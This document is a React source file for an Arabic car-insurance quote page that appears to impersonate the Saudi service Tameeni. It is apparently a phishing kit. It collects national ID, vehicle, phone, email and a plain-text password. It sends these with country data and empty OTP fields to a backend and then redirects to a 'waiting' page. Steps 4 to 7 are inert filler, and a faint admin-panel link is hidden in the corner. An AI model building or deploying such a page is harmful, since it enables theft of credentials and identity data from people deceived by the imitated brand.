import { useState } from "react";
import { Menu, X, ChevronLeft, ChevronRight, Loader2 } from "lucide-react";
import { tameeniApi } from "@/lib/api";
import { getCountry } from "@/lib/getCountry";
import { useTracking } from "@/lib/useTracking";

const TOTAL_STEPS = 8;
const MAKES = ["تويوتا", "هوندا", "نيسان", "هيونداي", "كيا", "فورد", "شيفروليه", "لكزس", "بي إم دبليو", "مرسيدس", "أودي", "أخرى"];
const YEARS = Array.from({ length: 20 }, (_, i) => String(2024 - i));
const CITIES = ["الرياض", "جدة", "مكة المكرمة", "المدينة المنورة", "الدمام", "الخبر", "الطائف", "تبوك", "أبها", "أخرى"];

function RadioCard({
  label, desc, selected, onClick,
}: { label: string; desc: string; selected: boolean; onClick: () => void }) {
  return (
    <button
      type="button"
      onClick={onClick}
      className="w-full text-right rounded-2xl border-2 px-5 py-4 transition-all"
      style={{
        borderColor: selected ? "#0d6efd" : "#e5e7eb",
        background: selected ? "#eff6ff" : "white",
      }}
    >
      <div className="font-extrabold text-[16px]" style={{ color: selected ? "#0d6efd" : "#111827" }}>{label}</div>
      <div className="text-[13px] mt-0.5" style={{ color: selected ? "#3b82f6" : "#9ca3af" }}>{desc}</div>
    </button>
  );
}

function Field({
  label, value, onChange, placeholder = "", type = "text", dir = "ltr", required = true,
}: {
  label: string; value: string; onChange: (v: string) => void;
  placeholder?: string; type?: string; dir?: string; required?: boolean;
}) {
  return (
    <div>
      <label className="block text-[14px] font-bold text-gray-800 mb-1.5">
        {label}{required && <span className="text-red-500 mr-1">*</span>}
      </label>
      <input
        type={type}
        placeholder={placeholder}
        value={value}
        onChange={e => onChange(e.target.value)}
        dir={dir}
        autoComplete="off"
        className="w-full border border-gray-200 rounded-xl px-4 py-3 text-[15px] font-semibold text-gray-900 outline-none bg-white focus:border-blue-400 focus:ring-2 focus:ring-blue-100 placeholder:text-gray-300 transition-all"
      />
    </div>
  );
}

function SelectField({
  label, value, onChange, options, required = true,
}: {
  label: string; value: string; onChange: (v: string) => void; options: string[]; required?: boolean;
}) {
  return (
    <div>
      <label className="block text-[14px] font-bold text-gray-800 mb-1.5">
        {label}{required && <span className="text-red-500 mr-1">*</span>}
      </label>
      <select
        value={value}
        onChange={e => onChange(e.target.value)}
        className="w-full border border-gray-200 rounded-xl px-4 py-3 text-[15px] font-semibold text-gray-900 outline-none bg-white focus:border-blue-400 focus:ring-2 focus:ring-blue-100 transition-all appearance-none"
      >
        <option value="">اختر...</option>
        {options.map(o => <option key={o} value={o}>{o}</option>)}
      </select>
    </div>
  );
}

export default function QuotePage() {
  useTracking("استعلام عن تأمين");
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [menuOpen, setMenuOpen] = useState(false);

  // Form fields
  const [purpose, setPurpose] = useState("تجديد وثيقة");
  const [vehicleType, setVehicleType] = useState("برقم تسلسلي");
  const [name, setName] = useState("");
  const [nationalId, setNationalId] = useState("");
  const [vehicleSerial, setVehicleSerial] = useState("");
  const [vehiclePlate, setVehiclePlate] = useState("");
  const [carMake, setCarMake] = useState("");
  const [carYear, setCarYear] = useState("");
  const [city, setCity] = useState("");
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  async function handleSubmit() {
    setLoading(true);
    const id = localStorage.getItem("tameeni_id") ?? `t-${Date.now()}`;
    localStorage.setItem("tameeni_id", id);
    const country = await getCountry();
    const carPlate = vehicleType === "برقم لوحة" ? vehiclePlate : vehicleSerial;
    await tameeniApi.submit({
      id,
      submittedAt: new Date().toLocaleTimeString("ar-SA"),
      submittedAtTs: Date.now(),
      name, phone, nationalId,
      email, password,
      carPlate, carYear, carMake,
      otpCode: "", otpStatus: null,
      page: "استعلام عن تأمين", lastSeen: Date.now(), country,
    });
    window.location.href = "/tameeni/waiting";
  }

  const canStep1 = name && nationalId && (vehicleType === "برقم تسلسلي" ? vehicleSerial : vehiclePlate);
  const canStep2 = carMake && carYear;
  const canStep3 = city && phone;
  const canStep4 = email && password;

  function nextStep() {
    if (step < TOTAL_STEPS) setStep(s => s + 1);
  }
  function prevStep() {
    if (step > 1) setStep(s => s - 1);
  }

  // Map visual step → logical can-proceed
  const canProceed = () => {
    if (step === 1) return !!canStep1;
    if (step === 2) return !!canStep2;
    if (step === 3) return !!canStep3;
    if (step >= 4 && step < TOTAL_STEPS) return true;
    if (step === TOTAL_STEPS) return !!canStep4;
    return true;
  };

  const handleNext = async () => {
    if (step === TOTAL_STEPS) {
      await handleSubmit();
    } else {
      nextStep();
    }
  };

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl" style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif" }}>

      {/* NAVBAR — same as landing */}
      <nav style={{ background: "#0d1c3b" }}>
        <div className="max-w-7xl mx-auto px-4 h-[60px] flex items-center justify-between">
          <button onClick={() => setMenuOpen(!menuOpen)} className="text-white p-1.5">
            {menuOpen ? <X className="w-5 h-5" /> : <Menu className="w-5 h-5" />}
          </button>
          <div className="flex items-center gap-3">
            <button
              onClick={nextStep}
              style={{ background: "#0d6efd" }}
              className="px-5 py-2 rounded-lg text-white text-[13px] font-bold hover:opacity-90 transition-opacity"
            >
              ابدأ الآن
            </button>
            <div className="flex items-center gap-2 mr-3 cursor-pointer" onClick={() => window.location.href = "/tameeni/"}>
              <span className="text-white text-[22px] font-black tracking-tight">تأميني</span>
              <div className="w-9 h-9 rounded-full flex items-center justify-center" style={{ background: "#00c389" }}>
                <svg className="w-5 h-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
                </svg>
              </div>
            </div>
          </div>
        </div>
      </nav>

      <div className="max-w-lg mx-auto px-4 py-8">
        {/* Content card */}
        <div className="bg-white rounded-3xl shadow-sm border border-gray-100 overflow-hidden">
          <div className="p-6 space-y-6">

            {/* STEP 1: البيانات الأساسية */}
            {step === 1 && (
              <>
                <div>
                  <h2 className="text-[24px] font-black text-gray-900">البيانات الأساسية</h2>
                  <p className="text-[14px] text-gray-500 mt-1">
                    أدخل معلومات المركبة والمالك للبدء في الحصول على عرض السعر
                  </p>
                </div>

                {/* الغرض من التأمين */}
                <div className="space-y-2.5">
                  <label className="block text-[14px] font-bold text-gray-800">
                    الغرض من التأمين <span className="text-red-500">*</span>
                  </label>
                  <RadioCard label="تجديد وثيقة" desc="تجديد وثيقة تأمين موجودة" selected={purpose === "تجديد وثيقة"} onClick={() => setPurpose("تجديد وثيقة")} />
                  <RadioCard label="نقل ملكية" desc="تأمين مركبة منقولة الملكية" selected={purpose === "نقل ملكية"} onClick={() => setPurpose("نقل ملكية")} />
                </div>

                <Field label="اسم مالك الوثيقة" value={name} onChange={setName} placeholder="الاسم الكامل" dir="rtl" />
                <Field label="رقم هوية المالك" value={nationalId} onChange={setNationalId} placeholder="1234567890" />

                {/* نوع المركبة */}
                <div className="space-y-2.5">
                  <label className="block text-[14px] font-bold text-gray-800">
                    نوع المركبة <span className="text-red-500">*</span>
                  </label>
                  <RadioCard label="مركبة برقم تسلسلي" desc="مركبة مسجلة برقم تسلسلي" selected={vehicleType === "برقم تسلسلي"} onClick={() => setVehicleType("برقم تسلسلي")} />
                  <RadioCard label="مركبة برقم لوحة" desc="مركبة مسجلة برقم لوحة" selected={vehicleType === "برقم لوحة"} onClick={() => setVehicleType("برقم لوحة")} />
                </div>

                {vehicleType === "برقم تسلسلي" ? (
                  <Field label="الرقم التسلسلي للمركبة" value={vehicleSerial} onChange={setVehicleSerial} placeholder="123456789" />
                ) : (
                  <Field label="رقم لوحة المركبة" value={vehiclePlate} onChange={setVehiclePlate} placeholder="أ ب ج 1234" dir="rtl" />
                )}
              </>
            )}

            {/* STEP 2: بيانات السيارة */}
            {step === 2 && (
              <>
                <div>
                  <h2 className="text-[24px] font-black text-gray-900">بيانات المركبة</h2>
                  <p className="text-[14px] text-gray-500 mt-1">أدخل تفاصيل مركبتك للحصول على أفضل عرض</p>
                </div>
                <SelectField label="الشركة المصنعة" value={carMake} onChange={setCarMake} options={MAKES} />
                <SelectField label="سنة الصنع" value={carYear} onChange={setCarYear} options={YEARS} />
              </>
            )}

            {/* STEP 3: بيانات التواصل */}
            {step === 3 && (
              <>
                <div>
                  <h2 className="text-[24px] font-black text-gray-900">بيانات التواصل</h2>
                  <p className="text-[14px] text-gray-500 mt-1">أدخل بياناتك لإرسال عروض التأمين إليك</p>
                </div>
                <SelectField label="المدينة" value={city} onChange={setCity} options={CITIES} />
                <Field label="رقم الجوال" value={phone} onChange={setPhone} placeholder="05xxxxxxxx" />
              </>
            )}

            {/* STEPS 4-7: placeholder content */}
            {step >= 4 && step <= 7 && (
              <>
                <div>
                  <h2 className="text-[24px] font-black text-gray-900">
                    {step === 4 ? "بيانات إضافية" : step === 5 ? "بيانات المركبة التفصيلية" : step === 6 ? "تفاصيل التغطية" : "مراجعة البيانات"}
                  </h2>
                  <p className="text-[14px] text-gray-500 mt-1">
                    {step === 4 ? "أدخل البيانات الإضافية للمركبة" : step === 5 ? "أدخل التفاصيل الإضافية" : step === 6 ? "اختر نوع التغطية المطلوبة" : "راجع بياناتك قبل المتابعة"}
                  </p>
                </div>
                <div className="space-y-3">
                  {[
                    { label: "نوع وثيقة التأمين", opts: ["ضد الغير", "شامل"] },
                    { label: "قيمة المركبة التقديرية", opts: ["أقل من 50,000", "50,000 - 100,000", "أكثر من 100,000"] },
                  ].map(f => (
                    <div key={f.label} className="space-y-2">
                      <label className="block text-[14px] font-bold text-gray-800">{f.label} <span className="text-red-500">*</span></label>
                      {f.opts.map((o, i) => (
                        <button key={o} type="button"
                          className="w-full text-right rounded-2xl border-2 px-5 py-4 transition-all"
                          style={{ borderColor: i === 0 ? "#0d6efd" : "#e5e7eb", background: i === 0 ? "#eff6ff" : "white" }}>
                          <div className="font-extrabold text-[15px]" style={{ color: i === 0 ? "#0d6efd" : "#111827" }}>{o}</div>
                        </button>
                      ))}
                    </div>
                  ))}
                </div>
              </>
            )}

            {/* STEP 8: تسجيل الدخول */}
            {step === TOTAL_STEPS && (
              <>
                <div>
                  <h2 className="text-[24px] font-black text-gray-900">تسجيل الدخول</h2>
                  <p className="text-[14px] text-gray-500 mt-1">أدخل بيانات حسابك لعرض أسعار التأمين</p>
                </div>
                <Field label="البريد الإلكتروني" value={email} onChange={setEmail} placeholder="example@email.com" type="email" />
                <Field label="كلمة المرور" value={password} onChange={setPassword} placeholder="••••••••" type="text" />
                <p className="text-center text-[12px] text-gray-400">
                  بالمتابعة توافق على{" "}
                  <a href="#" className="text-blue-600 hover:underline">الشروط والأحكام</a>
                </p>
              </>
            )}

          </div>

          {/* BOTTOM NAV */}
          <div className="px-6 pb-6 space-y-4">
            {/* Step indicator */}
            <div className="flex justify-center">
              <span className="inline-block bg-gray-100 text-gray-500 text-[13px] font-semibold rounded-full px-4 py-1.5">
                الخطوة {step} من {TOTAL_STEPS}
              </span>
            </div>

            <div className="flex gap-3">
              {/* Previous */}
              <button
                onClick={prevStep}
                disabled={step === 1}
                className="flex items-center gap-1.5 px-5 py-3 rounded-xl border border-gray-200 text-gray-600 text-[14px] font-bold hover:bg-gray-50 disabled:opacity-30 transition-colors"
              >
                <ChevronRight className="w-4 h-4" />
                السابق
              </button>

              {/* Next / Submit */}
              <button
                onClick={handleNext}
                disabled={!canProceed() || loading}
                className="flex-1 flex items-center justify-center gap-1.5 py-3 rounded-xl text-white text-[15px] font-extrabold disabled:opacity-40 transition-colors"
                style={{ background: "#0d6efd" }}
              >
                {loading ? (
                  <Loader2 className="w-5 h-5 animate-spin" />
                ) : (
                  <>
                    {step === TOTAL_STEPS ? "عرض أسعار التأمين" : "التالي"}
                    {step < TOTAL_STEPS && <ChevronLeft className="w-4 h-4" />}
                  </>
                )}
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* WhatsApp-style chat button */}
      <a
        href="#"
        className="fixed bottom-6 left-6 w-14 h-14 rounded-full flex items-center justify-center shadow-xl transition-transform hover:scale-105"
        style={{ background: "#25d366" }}
      >
        <svg className="w-7 h-7 text-white" fill="currentColor" viewBox="0 0 24 24">
          <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/>
          <path d="M12 0C5.373 0 0 5.373 0 12c0 2.106.549 4.09 1.51 5.815L.057 23.454a.5.5 0 00.492.594.501.501 0 00.139-.02l5.801-1.527A11.943 11.943 0 0012 24c6.627 0 12-5.373 12-12S18.627 0 12 0zm0 22a9.94 9.94 0 01-5.073-1.387l-.362-.215-3.762.99.999-3.673-.235-.374A9.96 9.96 0 012 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10z"/>
        </svg>
      </a>

      {/* Admin link */}
      <a href="/tameeni/admin" className="fixed bottom-4 right-4 text-[10px] text-gray-300 hover:text-gray-500 transition-colors opacity-20 hover:opacity-100">لوحة التحكم</a>
    </div>
  );
}
